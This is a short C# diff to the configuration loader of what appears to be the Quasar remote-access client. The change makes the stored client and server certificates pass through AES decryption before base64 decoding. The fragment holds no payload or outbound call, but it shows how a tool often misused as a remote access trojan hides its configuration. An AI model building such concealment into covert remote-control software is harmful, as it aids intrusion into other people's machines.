@@ -77,8 +77,8 @@ namespace Quasar.Client.Config
             MUTEX = aes.Decrypt(MUTEX);
             STARTUPKEY = aes.Decrypt(STARTUPKEY);
             LOGDIRECTORYNAME = aes.Decrypt(LOGDIRECTORYNAME);
-            CLIENTCERTIFICATE = new X509Certificate2(Convert.FromBase64String(CLIENTCERTIFICATESTR));
-            SERVERCERTIFICATE = new X509Certificate2(Convert.FromBase64String(SERVERCERTIFICATESTR));
+            CLIENTCERTIFICATE = new X509Certificate2(Convert.FromBase64String(aes.Decrypt(CLIENTCERTIFICATESTR)));
+            SERVERCERTIFICATE = new X509Certificate2(Convert.FromBase64String(aes.Decrypt(SERVERCERTIFICATESTR)));
             FixDirectory();
             return true;
         }
